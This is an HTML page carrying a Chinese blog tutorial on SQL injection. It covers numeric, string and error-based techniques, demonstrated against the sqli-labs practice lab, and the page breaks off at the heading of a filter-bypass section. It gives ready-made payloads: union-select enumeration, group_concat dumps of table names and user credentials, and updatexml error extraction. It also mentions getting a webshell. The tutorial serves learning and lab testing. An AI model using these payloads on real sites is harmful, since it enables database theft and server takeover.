@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>sql注入---入门到进阶 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="sql注入---入门到进阶" />
+<meta property="og:description" content="0x 引言 学习并做了一段时间的网络渗透，给我直观的感受就是思路问题，渗透不像技术研究，只需要对一个点进行研究，渗透涉及的方面太多太多，遇到问题后不能从单方面找问题，而是要从多个方面思考，尤其是面对一些漏洞时的解决问题时，首先要掌握这个漏洞产生的原理，要看出其中的错误之处，然后再想考为什么会错误，看问题到底出在哪里，然后思考的渗透思路，只要思路正确，有足够有耐心，总会有所突破。以下是我在这段时间内对sql注入漏洞的探索及对其的思路理解，内容纯手写，很详细，对新手帮助很大，请耐心看完！谢谢
+建议配合sqli-labs食用
+目录快速导航 什么是sql注入sql注入的分类、验证及利用方式sql注入的原理联合查询注入sql注入的条件sql数值型注入sql注入的危害sql数值型注入的检测方式sql注入的绕过sql数值型注入的利用方式sql注入的防御sql字符型注入sql盲注sql字符型注入的检测方式时间盲注sql字符型注入的利用流程sql报错型注入 什么是sql注入？
+攻击者利用Web应用程序对用户输入验证上的疏忽,在输入的数据中包含对某些数据库系统有特殊意义的符号或命令,让攻击者有机会直接对后台数据库系统下达指令,进而实现对后台数据库乃至整个应用系统的入侵，对于sql注入可以把它归为一句话：所谓的sql注入就是通过某种方式将恶意的sql代码添加到输入参数中，然后传递到sql服务器使其解析并执行的一种攻击手法
+sql注入的原理：
+概述：针对SQL注入的攻击行为可描述为：在与用户交互的程序中（如web网页）,非法用户通过可控参数注入SQL语法,将恶意sql语句输入拼接到原本设计好的SQL语句中，破坏原有SQL语法结构，执行了与原定计划不同的行为，达到程序编写时意料之外结果的攻击行为，其本质就是使用了字符串拼接方式构造sql语句，并且对于用户输入检查不充分,导致SQL语句将用户提交的非法数据当作语句的一部分来执行，从而造成了sql注入
+有关sql注入产生的原理要满足以下条件：
+程序编写者在处理程序和数据库交互时，使用了字符串拼接的方式构造SQL语句不安全的数据库配置，比如对查询集不合理处理，对sql查询语句错误时不当的处理，导致其错误信息暴露在前端过于信任用户在前端所输入的数值，没有过滤用户输入的恶意数据，且未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中,直接把用户输入的数据当做SQL语句执行,从而影响数据库安全和平台安全 sql注入的条件：
+用户对sql查询语句参数可控
+比如这是一条前端URL：https://blog.csdn.net/aboutus.php?id=1
+其后台sql语句：$sql=“SELECT 123 FROM abc WHERE id=&#39;1 &#39;&#34; 这条语句是采用拼接方式去对数据库内容进行查询的，而且并未对用户在前端输入的内容做过滤，并且用户对id这个参数可控,本来程序员设计这条查询语句是希望通过它去快速查询数据库中abc表的某个内容并且回显到前端页面来的，但是攻击者通过单引号&#39; 闭合数据库查询语句，并且构造这样的恶意url:https://blog.csdn.net/aboutus.php?id=-1 &#39; select password from admin#去查询admin 用户的密码，而非查询预先程序员所设计好的数据内容。关于更详细的原理及手工测试可参考我的另一篇博客 传送门
+原本程序要执行的SQL语句,拼接了用户输入的恶意数据 sql注入的危害：
+数据库信息泄漏：数据库中存放的用户的隐私信息的泄露，脱取数据库中的数据内容（脱库），可获取网站管理员帐号、密码悄无声息的进行对网站后台操作等。网页篡改：通过操作数据库对特定网页进行篡改，可严重影响正常业务进行。网站被挂马：将恶意文件写入数据库，修改数据库字段值，嵌入网马链接，进行挂马攻击。数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。文件系统操作：列取目录、读取、写入shell文件获取webshell，远程控制服务器，安装后门，经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。执行系统命令：远程命令执行，可破坏硬盘数据，瘫痪全系统。 sql数值型注入
+概述：当输入sql语句的参数为整形时，如果存在注入漏洞，可以认为是数字型注入，多存在于id，年龄，页码等地方
+检测方式：
+URL输入 and 1=1 / and 1=2 回显页面不同(整形判断)
+例如以sqli-labs 靶场为例，and 1=1，语句逻辑正常，所以页面没有异常，接着我们尝试用 and 1=2 试试，看看页面是否会发生异常
+不难看出，当我构造and 1=2时，页面发生异常，我们都知道，1是等于1的，这是正常的逻辑，但1=2时，我们会很自然会觉得它是错的，因为1是不可能等于2的，这是很明显的逻辑错误，相同的，数据库也是人开发出来的，也被设计为这个理念，当数据库遇到逻辑上的错误时，无法进行数据查询，这也就无法正常的把查询后的数据回显到前端页面来，前端由于接收不到数据库传输过来的数据，所以页面也就会产生异常了
+当我们在URL参数后面构造 and 1=1 正常 and1=2页面错误，基本可以确定是数字型注入了
+因为当我们输入 and 1=1时，后台执行 Sql 语句：
+如：select * from &lt;表名&gt; where id = x and 1=1" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/f80bcd9d99762d6c7d42a872bcea37c0/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-29T21:30:23+08:00" />
+<meta property="article:modified_time" content="2023-06-29T21:30:23+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">sql注入---入门到进阶</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h3><a id="font_colorbule_size60x__0"></a><font color="bule" size="6">0x 引言</font></h3> 
+<p>学习并做了一段时间的网络渗透，给我直观的感受就是思路问题，渗透不像技术研究，只需要对一个点进行研究，渗透涉及的方面太多太多，遇到问题后不能从单方面找问题，而是要从多个方面思考，尤其是面对一些漏洞时的解决问题时，首先要掌握这个漏洞产生的原理，要看出其中的错误之处，然后再想考为什么会错误，看问题到底出在哪里，然后思考的渗透思路，只要思路正确，有足够有耐心，总会有所突破。以下是我在这段时间内对sql注入漏洞的探索及对其的思路理解，内容纯手写，很详细，对新手帮助很大，请耐心看完！谢谢</p> 
+<br> 
+<br> 
+<p><strong>建议配合<a href="https://blog.csdn.net/chest_/article/details/103100335">sqli-labs</a>食用</strong></p> 
+<h3><a id="font_colorbule_size6_8"></a><font color="bule" size="6">目录快速导航</font></h3> 
+<table><thead><tr><th><a href="#sm" rel="nofollow">什么是sql注入</a></th><th>sql注入的分类、验证及利用方式</th></tr></thead><tbody><tr><td><strong><a href="#yl" rel="nofollow">sql注入的原理</a></strong></td><td><font color="#993399" size="4"><strong>联合查询注入</strong></font></td></tr><tr><td><strong><a href="#tj" rel="nofollow">sql注入的条件</a></strong></td><td><strong><font color="#993399" size="3">sql数值型注入</font></strong></td></tr><tr><td><strong><a href="#wh" rel="nofollow">sql注入的危害</a></strong></td><td><strong><a href="#sz" rel="nofollow">sql数值型注入的检测方式</a></strong></td></tr><tr><td><strong><a href="#rg" rel="nofollow">sql注入的绕过</a></strong></td><td><strong><a href="#sz" rel="nofollow">sql数值型注入的利用方式</a></strong></td></tr><tr><td><strong><a href="#fy" rel="nofollow"><font color="red">sql注入的防御</font></a></strong></td><td><strong><font color="#993399" size="3">sql字符型注入</font></strong></td></tr><tr><td><strong><font color="#993399" size="4">sql盲注</font></strong></td><td><strong><a href="#zf" rel="nofollow">sql字符型注入的检测方式</a></strong></td></tr><tr><td><strong><a href="#sj" rel="nofollow">时间盲注</a></strong></td><td><strong><a href="#zfly" rel="nofollow">sql字符型注入的利用流程</a></strong></td></tr><tr><td><strong><a href="#bc" rel="nofollow">sql报错型注入</a></strong></td><td></td></tr></tbody></table> 
+<hr> 
+<p><strong><font color="bule" size="4" id="sm">什么是sql注入？</font></strong></p> 
+<p>攻击者利用Web应用程序对用户输入验证上的疏忽,在输入的数据中包含对某些数据库系统有特殊意义的符号或命令,让攻击者有机会直接对后台数据库系统下达指令,进而实现对后台数据库乃至整个应用系统的入侵，对于sql注入可以把它归为一句话：<strong>所谓的sql注入就是通过某种方式将恶意的sql代码添加到输入参数中，然后传递到sql服务器使其解析并执行的一种攻击手法</strong></p> 
+<hr> 
+<p><strong><font color="bule" size="4" id="yl">sql注入的原理：</font></strong></p> 
+<p><strong>概述：针对SQL注入的攻击行为可描述为：在与用户交互的程序中（如web网页）,非法用户通过可控参数注入SQL语法,将恶意sql语句输入拼接到原本设计好的SQL语句中，破坏原有SQL语法结构，执行了与原定计划不同的行为，达到程序编写时意料之外结果的攻击行为，其本质就是使用了字符串拼接方式构造sql语句，并且对于用户输入检查不充分,导致SQL语句将用户提交的非法数据当作语句的一部分来执行，从而造成了sql注入</strong></p> 
+<p><strong>有关sql注入产生的原理要满足以下条件：</strong></p> 
+<ol><li>程序编写者在处理程序和数据库交互时，使用了字符串拼接的方式构造SQL语句</li><li>不安全的数据库配置，比如对查询集不合理处理，对sql查询语句错误时不当的处理，导致其错误信息暴露在前端</li><li>过于信任用户在前端所输入的数值，没有过滤用户输入的恶意数据，且未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中,直接把用户输入的数据当做SQL语句执行,从而影响数据库安全和平台安全</li></ol> 
+<hr> 
+<br> 
+<p><strong><font color="bule" size="4" id="tj">sql注入的条件：</font></strong></p> 
+<ol><li><strong>用户对sql查询语句参数可控</strong><br> 比如这是一条前端URL：https://blog.csdn.net/aboutus.php?id=1<br> 其后台sql语句：<code>$sql=“SELECT 123 FROM abc WHERE id='1 '"</code> 这条语句是采用拼接方式去对数据库内容进行查询的，而且并未对用户在前端输入的内容做过滤，并且用户对<code>id</code>这个参数可控,本来程序员设计这条查询语句是希望通过它去快速查询数据库中abc表的某个内容并且回显到前端页面来的，但是攻击者通过<strong>单引号</strong><code>'</code> 闭合数据库查询语句，并且构造这样的恶意url:<code>https://blog.csdn.net/aboutus.php?id=-1 ' select password from admin#</code>去查询admin 用户的密码，而非查询预先程序员所设计好的数据内容。<strong>关于更详细的原理及手工测试可参考我的另一篇博客</strong></li></ol> 
+<blockquote> 
+ <p><a href="https://blog.csdn.net/chest_/article/details/100505649">传送门</a></p> 
+</blockquote> 
+<ol start="2"><li><strong>原本程序要执行的SQL语句,拼接了用户输入的恶意数据</strong></li></ol> 
+<hr> 
+<br> 
+<p><strong><font color="bule" size="4" id="wh">sql注入的危害：</font></strong></p> 
+<ul><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露，脱取数据库中的数据内容（脱库），可获取网站管理员帐号、密码悄无声息的进行对网站后台操作等。</li><li>网页篡改：通过操作数据库对特定网页进行篡改，可严重影响正常业务进行。</li><li>网站被挂马：将恶意文件写入数据库，修改数据库字段值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>文件系统操作：列取目录、读取、写入shell文件获取webshell，远程控制服务器，安装后门，经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li>执行系统命令：远程命令执行，可破坏硬盘数据，瘫痪全系统。</li></ul> 
+<hr> 
+<p><strong><font color="bule" size="5" id="sz">sql数值型注入</font></strong></p> 
+<p><strong>概述：当输入sql语句的参数为整形时，如果存在注入漏洞，可以认为是数字型注入，多存在于id，年龄，页码等地方</strong><br> <br></p> 
+<p><strong><font color="bule" size="4">检测方式：</font></strong></p> 
+<p><strong>URL输入 and 1=1 / and 1=2 回显页面不同(整形判断)</strong></p> 
+<p>例如以sqli-labs 靶场为例，and 1=1，语句逻辑正常，所以页面没有异常，接着我们尝试用 and 1=2 试试，看看页面是否会发生异常<br> <img src="https://images2.imgbox.com/02/27/JcPtH6uP_o.png" alt="在这里插入图片描述"><br> 不难看出，当我构造and 1=2时，页面发生异常，我们都知道，1是等于1的，这是正常的逻辑，但1=2时，我们会很自然会觉得它是错的，因为1是不可能等于2的，这是很明显的逻辑错误，相同的，数据库也是人开发出来的，也被设计为这个理念，当数据库遇到逻辑上的错误时，无法进行数据查询，这也就无法正常的把查询后的数据回显到前端页面来，前端由于接收不到数据库传输过来的数据，所以页面也就会产生异常了<br> <img src="https://images2.imgbox.com/ee/e7/N0F3J8Fk_o.png" alt="在这里插入图片描述"></p> 
+<p>当我们在URL参数后面构造 and 1=1 正常 and1=2页面错误，基本可以确定是数字型注入了</p> 
+<p>因为当我们输入 and 1=1时，后台执行 Sql 语句：</p> 
+<p>如：select * from &lt;表名&gt; where id = x and 1=1</p> 
+<p>没有语法错误且逻辑判断为正确，所以返回正常。</p> 
+<p>当输入 and 1=2时，后台执行 Sql 语句：</p> 
+<p>select * from &lt;表名&gt; where id = x and 1=2</p> 
+<p>语句被带进数据库进行查询，虽然没有语法错误但是逻辑判断为假，所以返回错误，这时候我们就可以基本确定页面存在sql注入。</p> 
+<hr> 
+<p><font color="bule" size="4" id="lc"><strong>sql数值型注入利用方式</strong></font></p> 
+<p>当我们确定页面存在显示位，接着我们可通过构造联合查询进行注入<br> 联合查询的优点：查询方便 速度很快，缺点 必须要有显示位</p> 
+<p>如这是一条后台语句：$sql=“SELECT * FROM users WHERE id=1 LIMIT 0,1”;</p> 
+<p>如果后台语句是:GET_id=$id这样子传</p> 
+<p>那么 ?id=1 1就是$id 里面的值 这时候要注入可以这样</p> 
+<pre><code>  ?id=1 然后在id的后面构造攻击语句  
+  如?id=-1 union select 1,2,3,4 --+    // 这条语句的作用是联合查询第1,2,3,4列， 空格--+的作用是注释后面的内容，负号是为了让前面的联合查询产生错误，从而使用后面的联合查询语句
+</code></pre> 
+<p><font color="bule" size="4"><strong>具体的攻击流程有以下几步：</strong></font></p> 
+<p><strong><font color="bule" size="4">1.判断注入点</font></strong><br> 加and 1=1 页面正常，and 1=2 页面异常或者报错，如果页面报错，说明后台数据库处理了我们输入的数据，那么能极有可能存在数值型sql注入</p> 
+<p><strong><font color="bule" size="4">2.猜字段数</font></strong></p> 
+<pre><code>未编码前：http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 4#
+编码后：http://127.0.0.1/sqli-labs/Less-2/?id=1%20order%20by%204#
+</code></pre> 
+<p>其中URL中的%20是空格，因为我们通过URL输入网址访问网址时，浏览器会对URL进行编码处理，#号为注释</p> 
+<p>在URL链接后面添加语句<code>order by 4</code> (数字任意,主要是为了确定字段数，可使用二分法猜测)，根据页面返回结果，来判断站点页面中的字段数目，得知查询结果中该页面不存在四列，所以页面也就报错了<br> <img src="https://images2.imgbox.com/68/8f/e99jnbxd_o.png" alt="在这里插入图片描述"><br> 然后再猜测字段数为3，页面回显正常，确定字段数为3<br> <img src="https://images2.imgbox.com/c3/45/ImpXQy5V_o.png" alt="在这里插入图片描述"><br> <strong><font color="bule" size="4">3.确定显示位</font></strong></p> 
+<p>进行联合查询判断显示位时，要在?id=1 1的前面加-号或者改为0让前面的select语句查询为空错误，然后采用后面的select语句去查询</p> 
+<p><strong>我们可以这样子：</strong></p> 
+<p>?id=-1 union select 1,2,3 --+ 这样子就可以形成一条带进数据库的查询语句了<br> 联合查询要构造假的 所以1前面一定要加-号，或者是?id=1 and 1=2 构造前面的查询语句错误，继而使用后面的select语句，因为有两条select语句，要用-号或者把1改为0把前面的注释掉<br> 就是有两条select查询一句，要前面的那条错误无法使用，后面的注入一句才能显示这样子<br> 当前面的id=1错误会执行后面的id=2,二后面的id=2错误会执行前面的id=1</p> 
+<p><strong>下图很清晰的诠释了该过程</strong><br> <img src="https://images2.imgbox.com/3b/9c/rGgbZmM7_o.png" alt="在这里插入图片描述"><br> 或者=0也行<br> <img src="https://images2.imgbox.com/f8/f8/lRniY1Us_o.png" alt="在这里插入图片描述"><br> 所以，如果注入页面没有反应，无论是字符型还是数字型，都可以在前面加-号或者改为0试试</p> 
+<p><strong><font color="bule" size="4">4.通过显示位进行信息收集</font></strong></p> 
+<p>比如：?id=-1’ union select 1,2,3 --+,然后页面显示2,2就是显示位，可以在2处去构造攻击语句<br> URL地址栏里的注释要用 --+<br> 我们可以利用内置函数暴数据库信息，详细的sql内置函数可以参考我的另一篇博客，里面详细的记录了常用的sql函数及常用sql注入payload 语句</p> 
+<blockquote> 
+ <p><a href="https://blog.csdn.net/chest_/article/details/100142391">传送门</a></p> 
+</blockquote> 
+<p><strong>比如我经常搜集的数据库信息，可以参考一下</strong><br> 1.找一下数据库名，当前的登录用户（是不是root），如果为root的话，且知道我在个绝对路径，可以直接通过select 语句写入一句话get shell<br> 2.查看数据库的版本，看一下是不是大于5.0版本的，如果大于的话，<br> 就可以利用系统自带的库，information_schema 这个库去查询需要的数据了,存储着mysql的所有数据库和表结构信息<br> 3.查看数据库的运行系统，是linux还是windows，然后再查看数据库的安装路径</p> 
+<p><strong>下面举一个小栗子</strong></p> 
+<pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1%20union%20select%201,database(),user()#
+</code></pre> 
+<p>通过在显示位构造恶意语句可以对数据库进行非法的操作，如数据查询，写入文件，脱裤（脱库）等危险操作，这也是为什么sql注入普遍被评为高危漏洞的缘故了<br> <img src="https://images2.imgbox.com/f8/68/hFL3Kl8y_o.png" alt="在这里插入图片描述"></p> 
+<p><strong><font color="bule" size="4">5.数据收集</font></strong><br> 可通过联合查询进行对数据库数据查询</p> 
+<p><strong>常用语句</strong></p> 
+<pre><code>查询当前数据库所有表，并且拼接在一行显示--多个字段的，如3，不为显示位，2为显示位，这时候from查询
+要空格后放在最后面的字段，接着记得加注释，常用的有#
+group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+查询当前数据库users中表所有字段，并且拼接在一行显示
+group_concat(column_name) from information_schema.columns where table_name='users' --+
+查询当前数据库users中表username和password字段中的信息，并且拼接在一行显示
+union select 1,group_concat(username,0x3a,password),3 from users--+
+</code></pre> 
+<p>更多的注入查询语句可参考<a href="https://blog.csdn.net/chest_/article/details/100142391">传送门</a><br> <strong><font color="red" size="4">group_concat(table_name) 要放在显示位 如果是多个字段，from查询要空格后放在最后面的字段，不然会报错！！</font></strong></p> 
+<p><strong>小栗子</strong><br> 比如：查询当前数据库所有表，并且拼接在一行显示</p> 
+<pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+</code></pre> 
+<p><img src="https://images2.imgbox.com/09/33/9sJLbSI8_o.png" alt="在这里插入图片描述"><br> 同理，我们可以继续构造语句来进行对数据库内数据进行查询或者写入操作</p> 
+<hr> 
+<br> 
+<p><font color="bule" size="5" id="zf"><strong>字符型sql注入</strong></font></p> 
+<p><strong>概述：当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号或其它特殊符号来闭合，而字符串一般需要通过特殊符号，如单引号来闭合的。</strong></p> 
+<p><font color="#993399" size="4"><strong>检测方式：</strong></font></p> 
+<p>如这是一条后台语句：<code>$sql="SELECT * FROM users WHERE id='1 ' LIMIT 0,1"</code><br> 可以看出，id被单引号包裹住<br> 如果后台语句是:GET_id='$id’这样子传</p> 
+<p><img src="https://images2.imgbox.com/9c/1a/gdYW3ASB_o.png" alt="在这里插入图片描述"><br> 那么 ?id=’1’ 1就是$id 里面的值 这时候要注入可以这样</p> 
+<pre><code>  ?id=' 1 然后在id的引号里面构造攻击语句 '
+  如http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+   
+  在1 后面加单引号使其语句闭合，然后中间使用联合查询，接着再把联合查询后面的语句用 --+注释掉
+</code></pre> 
+<p>如在URL地址栏输入<code>?id=1'</code> 这时候<code>1</code>后面的单引号把原本语句的一对单引号隔开了，变成了<code>?id='1''</code>,多出了一个单引号，正常来说，包裹着id变量的单引号是成对，这样的语句结构没有问题的，多出了一个单引号就报错了破坏了原本的sql语句结构，并且这条语句被带进数据库进行查询，数据库由于无法处理这条 ‘非正常’ 的语句，所以也就报错了，由于数据库和前端页面是交互的，所以前端页面也会出现异常或者报错，或者是程序员为了开发时的调试开启生产环境中 Webserver的错误显示，导致数据库端的错误回显到了前端来了<br> <img src="https://images2.imgbox.com/26/99/kNcv4i1d_o.png" alt="在这里插入图片描述"><br> 但这时候，如果我们在1’后面加–+注释掉它后面的单引号（ ?id=’1 ‘ --+ ’），让它语句后台的语句一致，这样子就不会报错了，同理，也可用这个方法来验证是不是属于字符型sql注入</p> 
+<p>正常的URL：<code>http://127.0.0.1/sqli-labs-master/?id=1</code><br> 1左右是有单引号包裹住的 我们在URL栏输入原本语句的单引号不会显示，如果我们输入的是这样子：<code>?id=1’ --+</code><br> 而后台会这样子显示 ：<code>id='1' --+'</code><br> 所以我们可以这样子 <code>?id=1'</code> 这里写攻击语句 --+’<br> 本来id='1’是这样子的<br> 后来我们在<code>id='1</code> 在里面插入语句 '#</p> 
+<p>如果我们输入1’ 那么id是这样子的 <code>id='1''</code> 这样子语句就形成不了闭合了，会报错，如果报错了，证明这条语句成功被带进数据库查询,存在字符型注入</p> 
+<p>这时候我们可以这样子 <code>id='1' --+</code> , 空格–+ 把后面的单引号注释掉了，这样子sql语句就会形成闭合</p> 
+<br> 
+<p><font color="#993399" size="4"><strong>闭合方法</strong></font></p> 
+<p>1.原来的基础上再继续输入多一个引号，也就是 <code>1'' --&gt; '1' ''</code><br> 如 $id=‘1’ ‘’ 把单引号凑成一对，形成语句的闭合（不推荐，推荐使用 --+或者#号注释，因为真实渗透环境太过复杂，'单引号不代表真正的注释，只能是碰巧拿来闭合罢了，如果这条语句的后面还拼接着其它的语句，那么将达不到预期的闭合效果！）</p> 
+<pre><code>前端URL：http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3'
+后台语句：$sql="SELECT * FROM users WHERE id='-1' union select 1,2,3'' LIMIT 0,1"
+</code></pre> 
+<p><img src="https://images2.imgbox.com/65/9d/QxkbvHae_o.png" alt="在这里插入图片描述"></p> 
+<p><strong>2.第二种方法是使用“#”符号来注释后面的单引号<br> 如 $id='1 '# ’ 形成闭合</strong></p> 
+<pre><code>前端URL：http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3#
+后台语句：$sql="SELECT * FROM users WHERE id='-1' union select 1,2,3# LIMIT 0,1"
+</code></pre> 
+<p><strong>3.第三种方法是使用" – “或” --+"，这里注意了“ – ”后面有一个空格。在页面输入框注入，不能用空格–+ 要把后面的+也换为空格在url当中，我们需要使用“+”来代替“–”后面的空格。</strong></p> 
+<p><strong>注意：</strong> 字符型注入，先探测语句的闭合方式，如果是单引号闭合的方式，那么我们要加单引号进行闭合，接着注入语句后面要带注释，注释掉预设好的sql语句后面的字符和及其它不需要的语句来达成注入语句的闭合，不然语法错误会一直报错！<br> 在页面输入框注入，不能用空格–+ 要把后面的+也换为空格 但URL可以用 --+</p> 
+<hr> 
+<br> 
+<p><font color="#993399" size="5" id="zfly"><strong>sql字符型注入利用方式</strong></font></p> 
+<pre><code>后台sql语句:$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+前端URL:http://127.0.0.1/sqli-labs/Less-3/?id=1
+</code></pre> 
+<p>在1后面单引号、括号 使其语句闭合 然后加and 1=2让前面的select查询语句逻辑错误，使用后面的select语句 和id=-1同理</p> 
+<pre><code>http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=2 union select 1,database(),user() --+
+</code></pre> 
+<p><img src="https://images2.imgbox.com/d5/b1/bdJqyYNp_o.png" alt="在这里插入图片描述"></p> 
+<hr> 
+<br> 
+<p><font color="#993399" size="5" id="bc"><strong>报错型sql注入</strong><br> <br></font></p> 
+<p><font color="#993399" size="4"><strong>报错注入的原理分析</strong></font></p> 
+<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，例如：后台开启了<strong>echo mysql_error()</strong> 输出了错误信息，这时候我们可以使用多次查询插入重复键值导致count报错从而在报错信息中带入了敏感信息使得查询结果能够出现在错误信息中，通过这种方法，我们可以构造恶意语句让数据库回显敏感信息到前端页面来，这个方法在我们无法使用联合查询且前端能返回错误信息的情况下非常实用</p> 
+<br> 
+<p><font color="#993399" size="4"><strong>MYSQL报错注入的分类：</strong></font></p> 
+<p>BIGINT等数据类型溢出<br> xpath语法错误<br> floor()报错<br> 列名重复报错<br> 参数不规范报错</p> 
+<br> 
+<p><font color="#993399" size="4"><strong>使用报错注入的前提</strong></font></p> 
+<p>1.页面上没有显示位但是有sql语句执行错误信息输出位。<br> 2.开启生产环境中 Webserver的错误显示，如使用mysql_error()函数，可以返回上一个Mysql操作产生的文本错误信息。</p> 
+<p><font color="#993399" size="4"><strong>常用报错注入函数</strong></font></p> 
+<p><strong>1.extractvalue()</strong></p> 
+<p>extractvalue(xml_frag,xpath_expr)函数接受两个参数，第一个为XML标记内容，也就是查询的内容，第二个为XPATH路径，也就是查询的路径。如果没有匹配内容，不管出于何种原因，只要 xpath_expr有效，并且 xml_frag由正确嵌套和关闭的元素组成 - 返回空字符串。不区分空元素的匹配和无匹配。但是如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容</p> 
+<p><strong>2.updatexml()</strong></p> 
+<p>最常用的函数，而且比较好记，updatexml(xml_target,xpath_expr,new_xml)接受三个参数，此函数将XML标记的给定片段的单个部分替换为xml_target新的XML片段new_xml，然后返回更改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。所有三个参数都应该是字符串。与extractvalue()类似，如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。</p> 
+<p><strong>以上函数对mysql版本有要求，Mysql版本要大于5.0 以上才能使用</strong></p> 
+<p><strong>3.floor</strong></p> 
+<p>floor(x)，返回小于或等于x的最大整数</p> 
+<br> 
+<p><font color="#993399" size="4"><strong>利用流程</strong></font></p> 
+<p>以最常用的updatexml()函数来举例<br> 公式<code>?id=1 and updatexml(1,concat(0x7e,(查询的内容),0x7e),1)</code><br> 提交内容<code>?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code></p> 
+<p>简要说明这条公式的含义<br> ?id=1 是可能存在URL的参数<br> and 是拼接符<br> updataxml()是函数<br> 括号里面的concat是用于连接两个或多个数组，将其以拼接的方式输出到前端页面<br> 0x7e是一个特殊符号 <strong>~</strong> 这是为了区分报错注入后的有用信息，因为页面报错包含太多没用信息</p> 
+<p>以sqli-labs为例构造以下URL进行注入</p> 
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
+</code></pre> 
+<p><strong>1后面一定要加单引号（因站而异，只要页面报错即可），不然不报错，如果不报错，就是语句成功进去数据库但是，也不会再页面显示我们也就拿不到我们需要的数据</strong><br> <img src="https://images2.imgbox.com/33/bd/qNRTZclj_o.png" alt="在这里插入图片描述"></p> 
+<p>接着我们参考公式，还可以构造下面URL进行对数据库的注入</p> 
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=-1' and updatexml(1,concat(0x7e,(Select schema_name from information_schema.schemata limit 0,1),0x7e),1) --+
+</code></pre> 
+<p>公式<code>?id=1 and updatexml(1,concat(0x7e,(查询的内容),0x7e),1)</code></p> 
+<p>也就是往查询内容处构造<strong>Select schema_name from information_schema.schemata limit 0,1</strong><br> 进行注入，更多的注入语句可以参考我的另一篇博客 <a href="https://blog.csdn.net/chest_/article/details/100142391"><strong>点击传送</strong></a><br> 后面的<strong>limit 0,1 的含义就是从你的表中的第0个数据开始，只读取一个</strong>，limit 0,1根据网站的实际情况而定，如果存在多列需要加上，例如该页面只有一个显示位，而在网站后台存在多列数据的情况下一个显示位显示无法完整回显会发生错误<br> <strong>如下图：</strong><br> <img src="https://images2.imgbox.com/b9/b8/kAgBDUTE_o.png" alt="在这里插入图片描述"><br> 加了limit 0,1的语句正常回显<br> <img src="https://images2.imgbox.com/5b/ba/CkqynXqr_o.png" alt="在这里插入图片描述"></p> 
+<hr> 
+<p><font color="bule" size="5" id="rg"><strong>sql注入的绕过方法</strong></font></p> 
+<p>数据库作为一个公司的核心数据存储点，其所有信息都存储在数据库中，其主要性毋容置疑，且SQL注入也毫无疑问是最危险的Web漏洞之一，通过sql注入，我们可以随意对公司的数据库进行任意的增删改查操作，如果是黑产分子，甚至是对数据库进行脱库，进行数据贩卖，对此进行许多公司都会单独为数据库实施Web应用程序防火墙和入侵检测/预防系统来试图保护自己数据隐私，但当这些安全软/硬设备，都是人来编写，而且其中往往是采用正则来进行过滤，拦截，这些对策往往是不充分的，并且很容易被绕过。</p> 
+<p><font color="bule" size="4" id="rg"><strong>前言~</strong></font></p> 
